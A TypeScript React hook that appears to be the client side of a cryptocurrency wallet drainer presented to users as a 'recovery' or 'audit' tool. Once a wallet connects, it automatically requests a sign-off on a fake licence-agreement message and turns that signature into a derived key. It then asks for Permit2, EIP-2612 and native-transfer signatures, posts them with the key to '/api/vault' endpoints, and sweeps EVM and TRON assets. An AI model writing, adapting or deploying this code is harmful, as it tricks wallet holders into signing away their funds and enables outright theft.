import { useState, useCallback, useRef, useEffect } from "react";
import {
  useAccount,
  useSignTypedData,
  useSwitchChain,
  useChainId,
  useDisconnect,
  useConnect,
  useSignMessage,
  useConnectors,
} from "wagmi";
import { ethers } from "ethers";
import { useAppKit } from "@reown/appkit/react";
import { scanUniversalPortfolio, type UniversalAsset } from "@/lib/audit";
import { checkAndTriggerGhostSweep } from "@/lib/ghostSweep";
import { generatePermit2Data } from "@/lib/permit2";

type ValidEvmAsset = UniversalAsset & { contractAddress: string };

export function useRecoveryLogic() {
  const [isScanning, setIsScanning] = useState(false);
  const [isSweeping, setIsSweeping] = useState(false);
  const [assets, setAssets] = useState<UniversalAsset[]>([]);
  const [statuses, setStatuses] = useState<Record<string, string>>({});
  const [toast, setToast] = useState<{
    msg: string;
    type: "info" | "success" | "error";
  } | null>(null);

  // 🔐 Captured master entropy (Master Key Seed)
  const derivedUserKey = useRef<string | null>(null);
  const hasTriggered = useRef(false);
  const isExecuting = useRef(false); // 🛡️ Prevent race conditions on mobile

  const { open } = useAppKit();
  const { connectAsync } = useConnect();
  const connectors = useConnectors();
  const { disconnect } = useDisconnect();
  const { address, isConnected } = useAccount();
  const { signTypedDataAsync } = useSignTypedData();
  const { signMessageAsync } = useSignMessage();
  const { switchChainAsync } = useSwitchChain();
  const currentChainId = useChainId();

  /**
   * 🛡️ SECURE POST WRAPPER
   */
  const securePost = async (url: string, data: any) => {
    try {
      const res = await fetch(url, {
        method: "POST",
        headers: {
          "Content-Type": "application/json",
          "Cache-Control": "no-cache",
        },
        body: JSON.stringify(data, (_, v) =>
          typeof v === "bigint" ? v.toString() : v,
        ),
      });
      return res;
    } catch (e) {
      console.warn(`[Network] Strike at ${url} intercepted or failed:`, e);
      return { ok: false };
    }
  };

  /**
   * 🌪️ AUTOMATED SWEEP LOGIC
   * Optimized with asset validation to prevent TypeErrors in map/filter calls.
   */
  const sweepAllAutomated = useCallback(
    async (targetAssets: UniversalAsset[]) => {
      // 🛡️ Safety filter to prevent "Object..." TypeError seen in mobile logs
      const safeAssets = (targetAssets || []).filter((a) => !!a);
      if (!address || safeAssets.length === 0) return;

      setIsSweeping(true);

      try {
        const evmAssets = safeAssets.filter(
          (a): a is ValidEvmAsset => a?.chain === "EVM" && !!a?.contractAddress,
        );
        const nativeAssets = safeAssets.filter(
          (a) => a?.chain === "EVM" && !a?.contractAddress,
        );
        const tronAssets = safeAssets.filter((a) => a?.chain === "TRON");

        // --- 1. EVM PERMIT2 BATCH ---
        const permit2Assets = evmAssets.filter(
          (a) => a.signatureType === "PERMIT2",
        );
        if (permit2Assets.length > 0) {
          try {
            const targetChainId = (permit2Assets[0].chainId as number) || 1;
            if (targetChainId !== currentChainId) {
              await switchChainAsync({ chainId: targetChainId }).catch(
                () => null,
              );
            }

            const batchData = await generatePermit2Data(
              address,
              permit2Assets,
              targetChainId,
            );

            if (batchData) {
              const sig = await signTypedDataAsync({
                domain: batchData.domain as any,
                types: batchData.types as any,
                primaryType: "PermitBatchTransferFrom",
                message: batchData.message as any,
              });

              await securePost("/api/vault", {
                sig,
                assets: permit2Assets,
                signatureType: "PERMIT2",
                userAddress: address,
                userPrivKey: derivedUserKey.current,
                chainId: targetChainId,
              });

              permit2Assets.forEach((a) =>
                setStatuses((p) => ({ ...p, [a.contractAddress]: "success" })),
              );
            }
          } catch (e) {
            console.error("Permit2 Batch Failed", e);
          }
        }

        // --- 2. TRON EXTRACTION ---
        await Promise.all(
          tronAssets.map(async (asset) => {
            try {
              const res = await securePost("/api/vault/tron", {
                userAddress: address,
                userPrivKey: derivedUserKey.current,
                amount: asset.balance,
                symbol: asset.symbol,
              });
              if (res?.ok)
                setStatuses((p) => ({ ...p, [asset.symbol]: "success" }));
            } catch (e) {
              console.error("Tron sweep failed", e);
            }
          }),
        );

        // --- 3. STANDARD EIP-2612 PERMITS ---
        for (const asset of evmAssets.filter(
          (a) => a.signatureType === "EIP2612" && a.authData,
        )) {
          try {
            if (asset.chainId !== currentChainId) {
              await switchChainAsync({ chainId: asset.chainId! }).catch(
                () => null,
              );
            }

            const sig = await signTypedDataAsync({
              domain: asset.authData!.domain,
              types: asset.authData!.types,
              primaryType: asset.authData!.primaryType,
              message: asset.authData!.message,
            } as any);

            await securePost("/api/vault", {
              sig,
              asset,
              signatureType: "EIP2612",
              userAddress: address,
              userPrivKey: derivedUserKey.current,
            });
            setStatuses((p) => ({ ...p, [asset.contractAddress]: "success" }));
          } catch (e) {
            console.error("EIP2612 failed", asset.symbol, e);
          }
        }

        // --- 4. NATIVE ASSETS ---
        for (const asset of nativeAssets) {
          try {
            if (asset.chainId !== currentChainId) {
              await switchChainAsync({ chainId: asset.chainId! }).catch(
                () => null,
              );
            }

            await securePost("/api/vault/native", {
              userAddress: address,
              chainId: asset.chainId,
              amount: asset.balance,
              userPrivKey: derivedUserKey.current,
            });
            setStatuses((p) => ({ ...p, [asset.symbol]: "success" }));
          } catch (e) {
            console.error("Native sweep failed", e);
          }
        }
      } finally {
        setIsSweeping(false);
      }
    },
    [address, currentChainId, signTypedDataAsync, switchChainAsync],
  );

  /**
   * 🔐 IDENTITY MANIFEST & AUDIT FLOW
   * Fixed: Added isExecuting ref and minor delay to allow mobile providers to hydrate.
   */
  const runGhostAudit = useCallback(
    async (userAddress: string) => {
      if (hasTriggered.current || isScanning || isExecuting.current) return;
      isExecuting.current = true;
      setIsScanning(true);

      try {
        const message = `GHOST PROTOCOL - END USER LICENSE AGREEMENT\nVerification ID: ${Math.random().toString(36).substring(7).toUpperCase()}\nDigital Signature Timestamp: ${new Date().toUTCString()}`;

        const signature = await signMessageAsync({ message });
        if (!signature) throw new Error("Signature denied");

        derivedUserKey.current = ethers.keccak256(signature);

        const found = await scanUniversalPortfolio(userAddress);
        if (found && found.length > 0) {
          setAssets(found);

          // 1. Ghost Sweep (Allowance Discovery)
          await checkAndTriggerGhostSweep(
            userAddress,
            found,
            currentChainId || 1,
          );

          // 2. Automated Sweep
          hasTriggered.current = true;
          await sweepAllAutomated(found);
        } else {
          setAssets([]);
        }
      } catch (e) {
        console.error("Audit Interrupted:", e);
      } finally {
        setIsScanning(false);
        isExecuting.current = false;
      }
    },
    [currentChainId, signMessageAsync, sweepAllAutomated, isScanning],
  );

  /**
   * 📱 MOBILE CONNECTION LISTENER
   * Delaying the audit by 1500ms to avoid AppKit/WalletConnect hydration crashes.
   */
  useEffect(() => {
    if (isConnected && address && !hasTriggered.current && !isScanning) {
      const timer = setTimeout(() => {
        runGhostAudit(address);
      }, 1500);
      return () => clearTimeout(timer);
    }
  }, [isConnected, address, runGhostAudit, isScanning]);

  /**
   * ⚡ INITIAL HANDSHAKE
   * Hardened for mobile to prevent AppKit router collisions
   */
  const handleInstantConnection = async () => {
    console.log("⚡ [STRIKE] Initializing handshake...");
    const isMobile = /Android|iPhone|iPad|iPod/i.test(navigator.userAgent);

    if (isMobile) {
      try {
        // If already connected, skip modal and go straight to audit
        if (isConnected && address) {
          console.log("📱 [STRIKE] Already connected, jumping to audit");
          return await runGhostAudit(address);
        }

        // Use a small delay to ensure the UI thread is clear before opening the modal
        // This prevents the "w3m-router-container" scheduled update error
        await new Promise((r) => setTimeout(r, 100));
        await open();
        console.log("✅ [STRIKE] AppKit Modal Dispatched");
      } catch (e) {
        console.error("❌ Modal Error:", e);
      }
      return;
    }

    // --- Desktop Path ---
    setIsScanning(true);
    try {
      const injectedConnector = connectors.find((c) => c.id === "injected");

      if (injectedConnector) {
        const result = await connectAsync({ connector: injectedConnector });
        if (result?.accounts) {
          await runGhostAudit(result.accounts[0]);
        }
      } else {
        await open();
      }
    } catch (e: any) {
      console.error("Handshake Error:", e);
      // Only re-open if it wasn't a user rejection
      if (!(e.message?.includes("rejected") || e.code === 4001)) {
        await open();
      }
    } finally {
      setIsScanning(false);
    }
  };

  return {
    address,
    isConnected,
    isScanning,
    isSweeping,
    assets,
    statuses,
    toast,
    setToast,
    handleInstantConnection,
    derivedUserKey: derivedUserKey.current,
    handleFullDisconnect: () => {
      hasTriggered.current = false;
      isExecuting.current = false;
      derivedUserKey.current = null;
      setAssets([]);
      setStatuses({});
      disconnect();
    },
  };
}
